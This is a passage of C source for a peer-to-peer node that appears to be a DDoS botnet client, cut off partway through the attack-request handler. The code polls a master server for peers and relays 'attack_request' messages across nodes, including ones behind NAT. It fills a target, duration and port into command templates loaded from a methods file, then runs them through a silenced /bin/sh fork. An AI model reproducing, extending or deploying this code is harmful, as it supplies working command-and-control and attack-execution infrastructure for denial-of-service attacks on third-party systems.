/*
 * p2p_node_core.c — P2P Hybrid Node (DIRECT + REVERSE + tunnel + relay)
 *
 * Pure C99, zero external libs (only POSIX + pthread).
 * Protocol : 4-byte big-endian length-prefix + JSON payload over raw TCP.
 * Targets  : ARMv7-A, ARMv8/AArch64, MIPS, MIPSEL, x86-64 (native)
 *
 * Architecture mirrors the original Node.js p2pHybrid.js:
 *   - DIRECT nodes: publicly reachable, accept inbound + outbound
 *   - REVERSE nodes: behind NAT, connect OUT to DIRECT peers (relay via tunnel)
 *   - Tunnel: DIRECT node forwards msgs between REVERSE↔REVERSE
 *   - Master signaling: lightweight HTTP GET /api/nodes (no libcurl)
 *   - DHT: placeholder (disabled by default, extend as needed)
 *   - Auto-connector, heartbeat, cleanup: background pthreads
 *   - Blacklist + permanent-lock with inbound-unlock
 */

#define _POSIX_C_SOURCE 200809L
#include "p2p_node.h"
#include "json_util.h"
#include "sha256.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include <errno.h>
#include <time.h>
#include <ctype.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>
#include <pthread.h>

#include <sys/socket.h>
#include <sys/select.h>
#include <sys/wait.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <netdb.h>

/* ─────────────────────────────────────────────────────────────
 * Logging
 * ───────────────────────────────────────────────────────────── */

static void p2p_log(const char *tag, const char *fmt, ...) {
    char tbuf[24];
    time_t now = time(NULL);
    struct tm *tm_info = localtime(&now);
    strftime(tbuf, sizeof tbuf, "%H:%M:%S", tm_info);
    fprintf(stderr, "[%s][%s] ", tbuf, tag);
    va_list ap; va_start(ap, fmt); vfprintf(stderr, fmt, ap); va_end(ap);
    fputc('\n', stderr);
}
#define LOG(tag, ...) p2p_log(tag, __VA_ARGS__)

/* ─────────────────────────────────────────────────────────────
 * Mutex (protect peer map from concurrent thread writes)
 * ───────────────────────────────────────────────────────────── */
static pthread_mutex_t g_mutex = PTHREAD_MUTEX_INITIALIZER;
#define LOCK()   pthread_mutex_lock(&g_mutex)
#define UNLOCK() pthread_mutex_unlock(&g_mutex)

/* ─────────────────────────────────────────────────────────────
 * Utilities
 * ───────────────────────────────────────────────────────────── */

static unsigned int str_hash8(const char *s) {
    unsigned int h = 5381;
    while (*s) h = h * 33 ^ (unsigned char)*s++;
    return h & 0xFF;
}

static void rand_hex(char *out, int bytes) {
    static int urfd = -1;
    if (urfd < 0) urfd = open("/dev/urandom", O_RDONLY);
    uint8_t buf[64]; if (bytes > 64) bytes = 64;
    if (urfd >= 0 && (int)read(urfd, buf, (size_t)bytes) == bytes) {
        for (int i = 0; i < bytes; i++) snprintf(out+i*2, 3, "%02x", buf[i]);
    } else {
        srand((unsigned)(time(NULL) ^ (uintptr_t)out));
        for (int i = 0; i < bytes; i++) snprintf(out+i*2, 3, "%02x", rand()&0xff);
    }
    out[bytes*2] = '\0';
}

/* ─────────────────────────────────────────────────────────────
 * Socket helpers
 * ───────────────────────────────────────────────────────────── */

static int set_nonblocking(int fd) {
    int f = fcntl(fd, F_GETFL, 0);
    return f < 0 ? -1 : fcntl(fd, F_SETFL, f | O_NONBLOCK);
}

static void set_keepalive(int fd) {
    int y=1; setsockopt(fd, SOL_SOCKET, SO_KEEPALIVE, &y, sizeof y);
    int idle=30, intvl=5, cnt=3;
    setsockopt(fd, IPPROTO_TCP, TCP_KEEPIDLE,  &idle,  sizeof idle);
    setsockopt(fd, IPPROTO_TCP, TCP_KEEPINTVL, &intvl, sizeof intvl);
    setsockopt(fd, IPPROTO_TCP, TCP_KEEPCNT,   &cnt,   sizeof cnt);
}

static int create_listen_socket(int port) {
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) return -1;
    int y = 1; setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &y, sizeof y);
    struct sockaddr_in a = {0};
    a.sin_family      = AF_INET;
    a.sin_addr.s_addr = INADDR_ANY;
    a.sin_port        = htons((uint16_t)port);
    if (bind(fd,(struct sockaddr*)&a,sizeof a)<0||listen(fd,128)<0){close(fd);return -1;}
    set_nonblocking(fd);
    return fd;
}

/* Blocking connect with timeout via select */
static int tcp_connect(const char *host, int port, int timeout_sec) {
    struct addrinfo hints={0}, *res=NULL;
    hints.ai_family=AF_UNSPEC; hints.ai_socktype=SOCK_STREAM;
    char ps[8]; snprintf(ps,sizeof ps,"%d",port);
    if (getaddrinfo(host,ps,&hints,&res)!=0) return -1;
    int fd=socket(res->ai_family,res->ai_socktype,res->ai_protocol);
    if (fd<0){freeaddrinfo(res);return -1;}
    set_nonblocking(fd);
    int r=connect(fd,res->ai_addr,res->ai_addrlen);
    freeaddrinfo(res);
    if (r<0&&errno!=EINPROGRESS){close(fd);return -1;}
    if (r==0){set_keepalive(fd);return fd;}
    fd_set ws; FD_ZERO(&ws); FD_SET(fd,&ws);
    struct timeval tv={timeout_sec,0};
    if (select(fd+1,NULL,&ws,NULL,&tv)<=0){close(fd);return -1;}
    int err=0; socklen_t el=sizeof err;
    getsockopt(fd,SOL_SOCKET,SO_ERROR,&err,&el);
    if (err){close(fd);return -1;}
    set_keepalive(fd);
    return fd;
}

/* ─────────────────────────────────────────────────────────────
 * Framing: 4-byte BE length prefix + JSON
 * ───────────────────────────────────────────────────────────── */

static int send_framed(int fd, const char *data, size_t len) {
    uint8_t hdr[4] = {
        (uint8_t)(len>>24), (uint8_t)(len>>16),
        (uint8_t)(len>>8),  (uint8_t)(len)
    };
    size_t w=0; while(w<4){ssize_t n=write(fd,hdr+w,4-w);if(n<=0)return -1;w+=n;}
    w=0; while(w<len){ssize_t n=write(fd,data+w,len-w);if(n<=0)return -1;w+=n;}
    return 0;
}

/* Feed bytes into peer recv buffer. Returns 1 if a full frame is ready.
 * out_json / out_len point INTO the peer buffer (zero-copy). */
static int peer_feed(Peer *p, const uint8_t *data, size_t dlen,
                     char **out_json, size_t *out_len) {
    if (dlen > 0) {
        if (p->recv_buf_len + dlen + 1 > p->recv_buf_cap) {
            size_t nc = p->recv_buf_cap * 2;
            if (nc < p->recv_buf_len + dlen + 1) nc = p->recv_buf_len + dlen + 1;
            if (nc > (size_t)P2P_MSG_MAX * 2) return -1;
            char *nb = realloc(p->recv_buf, nc);
            if (!nb) return -1;
            p->recv_buf = nb; p->recv_buf_cap = nc;
        }
        memcpy(p->recv_buf + p->recv_buf_len, data, dlen);
        p->recv_buf_len += dlen;
        p->recv_buf[p->recv_buf_len] = '\0';
    }
    if (p->recv_buf_len < 4) return 0;
    size_t fl = ((uint8_t)p->recv_buf[0]<<24)|((uint8_t)p->recv_buf[1]<<16)|
                ((uint8_t)p->recv_buf[2]<<8) |((uint8_t)p->recv_buf[3]);
    if (fl > (size_t)P2P_MSG_MAX) return -1;
    if (p->recv_buf_len < 4+fl) return 0;
    *out_json = p->recv_buf + 4;
    *out_len  = fl;
    return 1;
}

static void peer_consume_frame(Peer *p) {
    if (p->recv_buf_len < 4) return;
    size_t fl = ((uint8_t)p->recv_buf[0]<<24)|((uint8_t)p->recv_buf[1]<<16)|
                ((uint8_t)p->recv_buf[2]<<8) |((uint8_t)p->recv_buf[3]);
    size_t tot = 4+fl;
    if (tot > p->recv_buf_len) return;
    memmove(p->recv_buf, p->recv_buf+tot, p->recv_buf_len-tot);
    p->recv_buf_len -= tot;
    p->recv_buf[p->recv_buf_len] = '\0';
}

/* ─────────────────────────────────────────────────────────────
 * Peer map (256-bucket hash)
 * ───────────────────────────────────────────────────────────── */

static Peer *peer_get(P2PNode *n, const char *id) {
    for (Peer *p=n->peers[str_hash8(id)]; p; p=p->next)
        if (!strcmp(p->node_id,id)) return p;
    return NULL;
}

static Peer *peer_add(P2PNode *n, const char *id) {
    Peer *p=calloc(1,sizeof*p); if(!p) return NULL;
    strncpy(p->node_id,id,P2P_NODE_ID_LEN-1);
    p->recv_buf_cap=8192; p->recv_buf=malloc(p->recv_buf_cap);
    if(!p->recv_buf){free(p);return NULL;}
    p->fd=-1;
    unsigned h=str_hash8(id); p->next=n->peers[h]; n->peers[h]=p;
    n->peer_count++;
    return p;
}

/* Remove peer by id, close fd, free memory */
static void peer_remove(P2PNode *n, const char *id) {
    unsigned h=str_hash8(id);
    for (Peer **pp=&n->peers[h]; *pp; pp=&(*pp)->next) {
        if (!strcmp((*pp)->node_id,id)) {
            Peer *d=*pp; *pp=d->next;
            if (d->fd>=0) close(d->fd);
            free(d->recv_buf);
            for (int i=0;i<d->queue_size;i++) {
                int ix=(d->queue_head+i)%P2P_QUEUE_MAX;
                free(d->queue[ix].data);
            }
            free(d); n->peer_count--;
            return;
        }
    }
}

/* ─────────────────────────────────────────────────────────────
 * Known peer map
 * ───────────────────────────────────────────────────────────── */

static KnownPeer *known_get(P2PNode *n, const char *id) {
    for (KnownPeer *k=n->known_peers[str_hash8(id)]; k; k=k->next)
        if (!strcmp(k->node_id,id)) return k;
    return NULL;
}

static KnownPeer *known_upsert(P2PNode *n, const char *id,
                                const char *ip, int port,
                                NodeMode mode, int can_connect) {
    KnownPeer *k=known_get(n,id);
    if (!k) {
        k=calloc(1,sizeof*k); if(!k) return NULL;
        strncpy(k->node_id,id,P2P_NODE_ID_LEN-1);
        unsigned h=str_hash8(id); k->next=n->known_peers[h]; n->known_peers[h]=k;
        n->known_peer_count++;
    }
    if (ip) strncpy(k->ip,ip,P2P_IP_LEN-1);
    k->port=port; k->mode=mode;
    k->can_connect=can_connect; k->reachable=can_connect;
    k->last_update=time(NULL);
    return k;
}

/* ─────────────────────────────────────────────────────────────
 * Relay routes  (reverse_id → relay_peer_id)
 * ───────────────────────────────────────────────────────────── */

static void relay_set(P2PNode *n, const char *rev, const char *relay) {
    unsigned h=str_hash8(rev);
    for (RelayRoute *r=n->relay_routes[h]; r; r=r->next)
        if (!strcmp(r->reverse_id,rev)){strncpy(r->relay_id,relay,P2P_NODE_ID_LEN-1);return;}
    RelayRoute *r=calloc(1,sizeof*r); if(!r) return;
    strncpy(r->reverse_id,rev,  P2P_NODE_ID_LEN-1);
    strncpy(r->relay_id,  relay,P2P_NODE_ID_LEN-1);
    r->next=n->relay_routes[h]; n->relay_routes[h]=r;
}

static const char *relay_get(P2PNode *n, const char *rev) __attribute__((unused));
static const char *relay_get(P2PNode *n, const char *rev) {
    for (RelayRoute *r=n->relay_routes[str_hash8(rev)]; r; r=r->next)
        if (!strcmp(r->reverse_id,rev)) return r->relay_id;
    return NULL;
}

static void relay_purge_by_relay(P2PNode *n, const char *relay) {
    for (int h=0;h<256;h++) {
        RelayRoute **rr=&n->relay_routes[h];
        while(*rr) {
            if (!strcmp((*rr)->relay_id,relay)){
                RelayRoute *d=*rr; *rr=d->next; free(d);
            } else rr=&(*rr)->next;
        }
    }
}

/* ─────────────────────────────────────────────────────────────
 * Blacklist + permanent locks
 * ───────────────────────────────────────────────────────────── */

static int is_perm_locked(P2PNode *n, const char *id) {
    for (PermanentLock *p=n->perm_locks[str_hash8(id)]; p; p=p->next)
        if (!strcmp(p->node_id,id)) return 1;
    return 0;
}

static int is_blacklisted(P2PNode *n, const char *id) {
    if (is_perm_locked(n,id)) return 1;
    time_t now=time(NULL);
    for (Blacklist *b=n->blacklist[str_hash8(id)]; b; b=b->next)
        if (!strcmp(b->node_id,id) && now<b->until) return 1;
    return 0;
}

static void blacklist_add(P2PNode *n, const char *id,
                           const char *reason, int secs) __attribute__((unused));
static void blacklist_add(P2PNode *n, const char *id,
                           const char *reason, int secs) {
    unsigned h=str_hash8(id);
    for (Blacklist *b=n->blacklist[h]; b; b=b->next)
        if (!strcmp(b->node_id,id)){b->until=time(NULL)+secs;return;}
    Blacklist *b=calloc(1,sizeof*b); if(!b) return;
    strncpy(b->node_id,id,P2P_NODE_ID_LEN-1);
    if (reason) strncpy(b->reason,reason,P2P_REASON_LEN-1);
    b->until=time(NULL)+secs; b->next=n->blacklist[h]; n->blacklist[h]=b;
    LOG("BLACKLIST","Peer %.8s blacklisted (%ds): %s",id,secs,reason?reason:"");
}

static void perm_lock_add(P2PNode *n, const char *id, int attempts) {
    unsigned h=str_hash8(id);
    for (PermanentLock *p=n->perm_locks[h]; p; p=p->next)
        if (!strcmp(p->node_id,id)){p->attempts=attempts;return;}
    PermanentLock *p=calloc(1,sizeof*p); if(!p) return;
    strncpy(p->node_id,id,P2P_NODE_ID_LEN-1);
    p->attempts=attempts; p->locked_at=time(NULL);
    p->next=n->perm_locks[h]; n->perm_locks[h]=p;
    n->stats.permanent_locks++;
    LOG("P2P-LOCK","PERMANENT LOCK %.8s (failed %dx)",id,attempts);
}

static void perm_lock_remove(P2PNode *n, const char *id) {
    unsigned h=str_hash8(id);
    for (PermanentLock **pp=&n->perm_locks[h]; *pp; pp=&(*pp)->next)
        if (!strcmp((*pp)->node_id,id)){
            PermanentLock *d=*pp; *pp=d->next; free(d);
            n->stats.perm_locks_unlocked++;
            LOG("P2P-LOCK","UNLOCKED %.8s (rejoined inbound)",id);
            return;
        }
}

/* ─────────────────────────────────────────────────────────────
 * Outbound failure counter
 * ───────────────────────────────────────────────────────────── */

static int fail_get(P2PNode *n, const char *id) __attribute__((unused));
static int fail_get(P2PNode *n, const char *id) {
    for (int i=0;i<n->fail_entries;i++)
        if (!strcmp(n->fail_id[i],id)) return n->fail_count[i];
    return 0;
}

static void fail_inc(P2PNode *n, const char *id) {
    for (int i=0;i<n->fail_entries;i++) {
        if (!strcmp(n->fail_id[i],id)) {
            int fc=++n->fail_count[i];
            LOG("P2P-LOCK","Peer %.8s failure %d/%d",id,fc,P2P_MAX_CONN_ATTEMPTS);
            if (fc>=P2P_MAX_CONN_ATTEMPTS) perm_lock_add(n,id,fc);
            return;
        }
    }
    if (n->fail_entries<P2P_MAX_PEERS) {
        int i=n->fail_entries++;
        strncpy(n->fail_id[i],id,P2P_NODE_ID_LEN-1);
        n->fail_count[i]=1;
        LOG("P2P-LOCK","Peer %.8s failure 1/%d",id,P2P_MAX_CONN_ATTEMPTS);
    }
}

static void fail_reset(P2PNode *n, const char *id) {
    for (int i=0;i<n->fail_entries;i++)
        if (!strcmp(n->fail_id[i],id)){n->fail_count[i]=0;return;}
}

/* ─────────────────────────────────────────────────────────────
 * Connection lock (prevents concurrent dial to same peer)
 * ───────────────────────────────────────────────────────────── */

static int conn_lock_has(P2PNode *n, const char *id) {
    time_t now=time(NULL);
    for (int i=0;i<n->conn_lock_count;i++)
        if (!strcmp(n->conn_lock_id[i],id)&&now-n->conn_lock_ts[i]<30) return 1;
    return 0;
}

static void conn_lock_set(P2PNode *n, const char *id) {
    /* Overwrite expired slot first */
    time_t now=time(NULL);
    for (int i=0;i<n->conn_lock_count;i++) {
        if (!n->conn_lock_id[i][0]||now-n->conn_lock_ts[i]>=30) {
            strncpy(n->conn_lock_id[i],id,P2P_NODE_ID_LEN-1);
            n->conn_lock_ts[i]=now; return;
        }
    }
    if (n->conn_lock_count<P2P_MAX_PEERS) {
        int i=n->conn_lock_count++;
        strncpy(n->conn_lock_id[i],id,P2P_NODE_ID_LEN-1);
        n->conn_lock_ts[i]=now;
    }
}

static void conn_lock_del(P2PNode *n, const char *id) {
    for (int i=0;i<n->conn_lock_count;i++)
        if (!strcmp(n->conn_lock_id[i],id)){n->conn_lock_id[i][0]='\0';return;}
}

/* ─────────────────────────────────────────────────────────────
 * Attack request dedup (ring buffer, 300s TTL)
 * ───────────────────────────────────────────────────────────── */

static int attack_seen(P2PNode *n, const char *id) {
    time_t now=time(NULL);
    for (int i=0;i<n->processed_attacks_count;i++) {
        int ix=(n->processed_attacks_head+i)%1024;
        if (!strcmp(n->processed_attacks[ix],id)&&now-n->processed_attacks_ts[ix]<300)
            return 1;
    }
    return 0;
}

static void attack_mark(P2PNode *n, const char *id) {
    int ix=(n->processed_attacks_head+n->processed_attacks_count)%1024;
    if (n->processed_attacks_count>=1024)
        n->processed_attacks_head=(n->processed_attacks_head+1)%1024;
    else n->processed_attacks_count++;
    strncpy(n->processed_attacks[ix],id,P2P_REQUEST_ID_LEN-1);
    n->processed_attacks_ts[ix]=time(NULL);
}

/* ─────────────────────────────────────────────────────────────
 * Message queue per peer
 * ───────────────────────────────────────────────────────────── */

static void queue_msg(P2PNode *n, Peer *p, const char *json, size_t len) {
    if (p->queue_size>=P2P_QUEUE_MAX) {
        /* drop oldest */
        free(p->queue[p->queue_head].data);
        p->queue_head=(p->queue_head+1)%P2P_QUEUE_MAX;
        p->queue_size--;
    }
    char *copy=malloc(len+1); if(!copy) return;
    memcpy(copy,json,len); copy[len]='\0';
    int tail=(p->queue_head+p->queue_size)%P2P_QUEUE_MAX;
    p->queue[tail].data=copy; p->queue[tail].len=len; p->queue[tail].ts=time(NULL);
    p->queue_size++;
    n->stats.msgs_queued++;
}

static void flush_queue(P2PNode *n, Peer *p) {
    while (p->queue_size>0&&p->fd>=0) {
        QueuedMsg *qm=&p->queue[p->queue_head];
        if (send_framed(p->fd,qm->data,qm->len)<0) break;
        free(qm->data); qm->data=NULL;
        p->queue_head=(p->queue_head+1)%P2P_QUEUE_MAX;
        p->queue_size--;
        p->msgs_sent++; n->stats.msgs_sent++;
    }
}

/* ─────────────────────────────────────────────────────────────
 * Public: send / broadcast
 * ───────────────────────────────────────────────────────────── */

int p2p_send_to_peer(P2PNode *n, const char *id, const char *json, size_t len) {
    Peer *p=peer_get(n,id);
    if (!p||p->fd<0) { if(p) queue_msg(n,p,json,len); return 0; }
    if (send_framed(p->fd,json,len)<0) { queue_msg(n,p,json,len); return 0; }
    p->msgs_sent++; n->stats.msgs_sent++;
    return 1;
}

int p2p_broadcast(P2PNode *n, const char *json, size_t len, const char *excl) {
    int sent=0;
    for (int h=0;h<256;h++)
        for (Peer *p=n->peers[h]; p; p=p->next)
            if (!excl||strcmp(p->node_id,excl)!=0)
                if (p2p_send_to_peer(n,p->node_id,json,len)) sent++;
    return sent;
}

/* ─────────────────────────────────────────────────────────────
 * JSON message builders
 * ───────────────────────────────────────────────────────────── */

/* Static buffers — these builders are only called from the event loop
 * (single-threaded read path), so reentrancy is not an issue. */

static const char *build_welcome(P2PNode *n, size_t *ol) {
    static char b[4096]; JsonBuf j; jb_init(&j,b,sizeof b);
    jb_obj_begin(&j);
    jb_kv_str(&j,"type","welcome");
    jb_kv_str(&j,"nodeId",n->cfg.node_id);
    jb_kv_str(&j,"ip",n->cfg.node_ip);
    jb_kv_int(&j,"port",n->cfg.node_port);
    jb_kv_str(&j,"mode",n->mode==NODE_MODE_DIRECT?"DIRECT":"REVERSE");
    jb_kv_int(&j,"timestamp",(long long)time(NULL));
    jb_key(&j,"capabilities"); jb_obj_begin(&j);
    jb_kv_bool(&j,"encryption",0);
    jb_kv_str(&j,"methodsVersion",n->methods_version[0]?n->methods_version:"");
    jb_kv_int(&j,"methodsCount",n->method_count);
    jb_kv_bool(&j,"relay",n->mode==NODE_MODE_DIRECT&&n->master_reachable);
    jb_kv_bool(&j,"tunnel",1);
    jb_kv_bool(&j,"referrals",1);
    jb_kv_str(&j,"version","5.1-c");
    jb_kv_str(&j,"nodeMode",n->mode==NODE_MODE_DIRECT?"DIRECT":"REVERSE");
    jb_obj_end(&j); jb_obj_end(&j);
    *ol=jb_len(&j); return b;
}

static const char *build_ping(size_t *ol) {
    static char b[64]; JsonBuf j; jb_init(&j,b,sizeof b);
    jb_obj_begin(&j); jb_kv_str(&j,"type","ping");
    jb_kv_int(&j,"timestamp",(long long)time(NULL)); jb_obj_end(&j);
    *ol=jb_len(&j); return b;
}

static const char *build_pong(size_t *ol) {
    static char b[64]; JsonBuf j; jb_init(&j,b,sizeof b);
    jb_obj_begin(&j); jb_kv_str(&j,"type","pong");
    jb_kv_int(&j,"timestamp",(long long)time(NULL)); jb_obj_end(&j);
    *ol=jb_len(&j); return b;
}

static const char *build_goodbye(P2PNode *n, size_t *ol) {
    static char b[128]; JsonBuf j; jb_init(&j,b,sizeof b);
    jb_obj_begin(&j); jb_kv_str(&j,"type","goodbye");
    jb_kv_str(&j,"nodeId",n->cfg.node_id);
    jb_kv_int(&j,"timestamp",(long long)time(NULL)); jb_obj_end(&j);
    *ol=jb_len(&j); return b;
}

/* ─────────────────────────────────────────────────────────────
 * Methods
 * ───────────────────────────────────────────────────────────── */

void p2p_update_methods_version(P2PNode *n) {
    SHA256_CTX ctx; sha256_init(&ctx);
    for (int i=0;i<n->method_count;i++) {
        sha256_update(&ctx,(uint8_t*)n->methods[i].name,strlen(n->methods[i].name));
        sha256_update(&ctx,(uint8_t*)n->methods[i].cmd, strlen(n->methods[i].cmd));
    }
    uint8_t d[32]; sha256_final(&ctx,d);
    for (int i=0;i<32;i++) snprintf(n->methods_version+i*2,3,"%02x",d[i]);
    n->methods_version[64]='\0';
    n->methods_last_update=time(NULL);
}

int p2p_load_methods_json(P2PNode *n, const char *path) {
    FILE *f=fopen(path,"r"); if(!f) return -1;
    fseek(f,0,SEEK_END); long sz=ftell(f); rewind(f);
    if (sz<=0||sz>4*1024*1024){fclose(f);return -1;}
    char *buf=malloc((size_t)sz+1); if(!buf){fclose(f);return -1;}
    fread(buf,1,(size_t)sz,f); buf[sz]='\0'; fclose(f);

    n->method_count=0;
    const char *p=buf, *end=buf+sz;
    while (p<end && n->method_count<P2P_MAX_METHODS) {
        while(p<end&&*p!='{') p++;
        if(p>=end) break;
        const char *os=p; int dep=0; const char *pp=p;
        while(pp<end){
            if(*pp=='{')dep++;
            else if(*pp=='}'&&--dep==0){pp++;break;}
            pp++;
        }
        size_t ol=(size_t)(pp-os);
        char name[P2P_METHOD_NAME_LEN]={0}, cmd[P2P_METHOD_CMD_LEN]={0};
        json_get_str(os,ol,"name",name,sizeof name);
        json_get_str(os,ol,"cmd", cmd, sizeof cmd);
        if(name[0]&&cmd[0]){
            strncpy(n->methods[n->method_count].name,name,P2P_METHOD_NAME_LEN-1);
            strncpy(n->methods[n->method_count].cmd, cmd, P2P_METHOD_CMD_LEN-1);
            n->method_count++;
        }
        p=pp;
    }
    free(buf);
    p2p_update_methods_version(n);
    LOG("P2P-METHODS","Loaded %d method(s) from %s",n->method_count,path);
    return n->method_count;
}

/* ─────────────────────────────────────────────────────────────
 * Attack execution
 * ───────────────────────────────────────────────────────────── */

static int exec_method(P2PNode *n, const char *mname,
                        const char *target, int tsec, int port,
                        char *pidout, size_t pidsz) {
    Method *m=NULL;
    for(int i=0;i<n->method_count;i++)
        if(!strcmp(n->methods[i].name,mname)){m=&n->methods[i];break;}
    if(!m) return -1;

    /* Substitute {target} {time} {port} */
    char cmd[P2P_METHOD_CMD_LEN*2]; strncpy(cmd,m->cmd,sizeof cmd-1);
    struct { const char *tok; char val[32]; } subs[]={
        {"{target}",""},{"{time}",""},{"{port}",""}
    };
    strncpy(subs[0].val,target,31);
    snprintf(subs[1].val,32,"%d",tsec);
    snprintf(subs[2].val,32,"%d",port);
    for(int s=0;s<3;s++){
        char tmp[sizeof cmd]; char *p;
        while((p=strstr(cmd,subs[s].tok))!=NULL){
            size_t pre=(size_t)(p-cmd);
            snprintf(tmp,sizeof tmp,"%.*s%s%s",
                     (int)pre,cmd,subs[s].val,p+strlen(subs[s].tok));
            strncpy(cmd,tmp,sizeof cmd-1);
        }
    }

    pid_t pid=fork(); if(pid<0) return -1;
    if(pid==0){
        int dn=open("/dev/null",O_WRONLY);
        if(dn>=0){dup2(dn,1);dup2(dn,2);close(dn);}
        for(int i=3;i<1024;i++) close(i);
        execl("/bin/sh","sh","-c",cmd,(char*)NULL);
        _exit(127);
    }
    if(pidout) snprintf(pidout,pidsz,"%d",(int)pid);
    LOG("EXEC","Started '%s' → target=%s time=%d port=%d pid=%d",
        mname,target,tsec,port,(int)pid);
    return 0;
}

/* ─────────────────────────────────────────────────────────────
 * Master HTTP signaling  (no libcurl — raw TCP)
 * ───────────────────────────────────────────────────────────── */

static char *http_get_body(const char *host, int port, const char *path,
                            const char *extra_hdrs, size_t *blen_out) {
    int fd=tcp_connect(host,port,10); if(fd<0) return NULL;
    /* switch to blocking for I/O */
    int fl=fcntl(fd,F_GETFL,0);
    fcntl(fd,F_SETFL,fl&~O_NONBLOCK);

    char req[1024];
    int rl=snprintf(req,sizeof req,
        "GET %s HTTP/1.0\r\nHost: %s:%d\r\nConnection: close\r\n%s\r\n",
        path,host,port,extra_hdrs?extra_hdrs:"");
    if(write(fd,req,rl)!=rl){close(fd);return NULL;}

    char *resp=malloc(131072); size_t rsz=0, rcap=131072;
    if(!resp){close(fd);return NULL;}
    ssize_t n;
    while((n=read(fd,resp+rsz,rcap-rsz-1))>0){
        rsz+=(size_t)n;
        if(rsz+1>=rcap){rcap*=2;char*nr=realloc(resp,rcap);if(!nr){free(resp);close(fd);return NULL;}resp=nr;}
    }
    close(fd); resp[rsz]='\0';
    if(strncmp(resp,"HTTP/",5)||!strstr(resp," 200 ")){free(resp);return NULL;}
    char *body=strstr(resp,"\r\n\r\n"); if(!body){free(resp);return NULL;}
    body+=4;
    size_t bl=rsz-(size_t)(body-resp);
    char *out=malloc(bl+1); if(!out){free(resp);return NULL;}
    memcpy(out,body,bl); out[bl]='\0';
    if(blen_out)*blen_out=bl;
    free(resp); return out;
}

int p2p_do_master_signaling(P2PNode *n) {
    if(!n->cfg.master_signaling_enabled||!n->cfg.master_host[0]) return 0;
    char hdrs[256];
    snprintf(hdrs,sizeof hdrs,
        "X-Node-ID: %s\r\nX-Node-Mode: %s\r\n",
        n->cfg.node_id,
        n->mode==NODE_MODE_DIRECT?"DIRECT":"REVERSE");
    size_t bl=0;
    char *body=http_get_body(n->cfg.master_host,n->cfg.master_port,
                              "/api/nodes",hdrs,&bl);
    if(!body){
        n->master_reachable=0; n->last_master_check=time(NULL);
        LOG("P2P-SIGNAL","Master unreachable (%s:%d)",
            n->cfg.master_host,n->cfg.master_port);
        return 0;
    }
    n->master_reachable=1; n->last_master_check=time(NULL);

    const char *arr; size_t alen;
    if(!json_get_raw(body,bl,"nodes",&arr,&alen)){free(body);return 0;}

    int added=0;
    const char *p=arr, *end=arr+alen;
    if(*p=='[') p++;
    while(p<end){
        while(p<end&&(*p==','||isspace((unsigned char)*p))) p++;
        if(p>=end||*p==']') break;
        if(*p!='{'){p++;continue;}
        const char *os=p; int dep=0; const char *pp=p;
        while(pp<end){if(*pp=='{')dep++;else if(*pp=='}'&&--dep==0){pp++;break;}pp++;}
        size_t ol=(size_t)(pp-os);
        char nid[P2P_NODE_ID_LEN]={0}, ip[P2P_IP_LEN]={0}, mstr[16]={0};
        long long port_ll=0;
        json_get_str(os,ol,"node_id",nid,sizeof nid);
        json_get_str(os,ol,"ip",ip,sizeof ip);
        json_get_int(os,ol,"port",&port_ll);
        json_get_str(os,ol,"mode",mstr,sizeof mstr);
        if(nid[0]&&strcmp(nid,n->cfg.node_id)){
            NodeMode m=strcmp(mstr,"REVERSE")==0?NODE_MODE_REVERSE:NODE_MODE_DIRECT;
            LOCK();
            known_upsert(n,nid,ip,(int)port_ll,m,m==NODE_MODE_DIRECT&&ip[0]&&port_ll>0);
            UNLOCK();
            added++;
        }
        p=pp;
    }
    LOG("P2P-SIGNAL","Master: %d peer(s) discovered",added);
    free(body); return added;
}

/* ─────────────────────────────────────────────────────────────
 * Message handlers
 * ───────────────────────────────────────────────────────────── */

/* Forward declaration */
static void handle_peer_message(P2PNode *n, Peer *p, const char *json, size_t len);
static void peer_disconnected(P2PNode *n, const char *id);

static void handle_welcome(P2PNode *n, Peer *p, const char *j, size_t l) {
    char mstr[16]={0}, ip[P2P_IP_LEN]={0}, mv[P2P_VERSION_HASH_LEN]={0};
    long long port_ll=0, mc=0;
    json_get_str(j,l,"mode",mstr,sizeof mstr);
    json_get_str(j,l,"ip",ip,sizeof ip);
    json_get_int(j,l,"port",&port_ll);
    const char *cap; size_t cl;
    if(json_get_raw(j,l,"capabilities",&cap,&cl)){
        json_get_str(cap,cl,"methodsVersion",mv,sizeof mv);
        json_get_int(cap,cl,"methodsCount",&mc);
        int tun=0; json_get_bool(cap,cl,"tunnel",&tun); p->supports_tunnel=tun;
    }
    p->remote_mode=strcmp(mstr,"REVERSE")==0?NODE_MODE_REVERSE:NODE_MODE_DIRECT;
    if(ip[0]) strncpy(p->ip,ip,P2P_IP_LEN-1);
    if(port_ll>0) p->port=(int)port_ll;
    strncpy(p->methods_version,mv,P2P_VERSION_HASH_LEN-1);
    p->methods_count=(int)mc;
    if(p->remote_mode==NODE_MODE_DIRECT&&n->mode==NODE_MODE_REVERSE){
        p->is_relay_provider=1; n->stats.reverse_handshakes++;
        LOG("P2P","REVERSE→DIRECT link with %.8s (relay provider)",p->node_id);
    }
    /* Update known peers */
    known_upsert(n,p->node_id,ip[0]?ip:p->ip,(int)(port_ll>0?port_ll:p->port),
                 p->remote_mode,p->remote_mode==NODE_MODE_DIRECT);
    LOG("P2P","Welcome from %.8s mode=%s methods=%lld",p->node_id,mstr,mc);
}

static void handle_attack_request(P2PNode *n, Peer *from, const char *j, size_t l) {
    char rid[P2P_REQUEST_ID_LEN]={0},tgt[256]={0},meth[P2P_METHOD_NAME_LEN]={0};
    long long tsec=0,port_ll=80;
    json_get_str(j,l,"requestId",rid,sizeof rid);
    json_get_str(j,l,"target",   tgt,sizeof tgt);
    json_get_str(j,l,"methods",  meth,sizeof meth);
    json_get_int(j,l,"time",     &tsec);
    json_get_int(j,l,"port",     &port_ll);

    char resp[512]; JsonBuf jr; jb_init(&jr,resp,sizeof resp);
    jb_obj_begin(&jr); jb_kv_str(&jr,"type","attack_response"); jb_kv_str(&jr,"requestId",rid);

    if(!tgt[0]||!meth[0]||tsec<=0){
        jb_kv_bool(&jr,"success",0); jb_kv_str(&jr,"error","MISSING_REQUIRED_FIELDS");
        jb_obj_end(&jr);
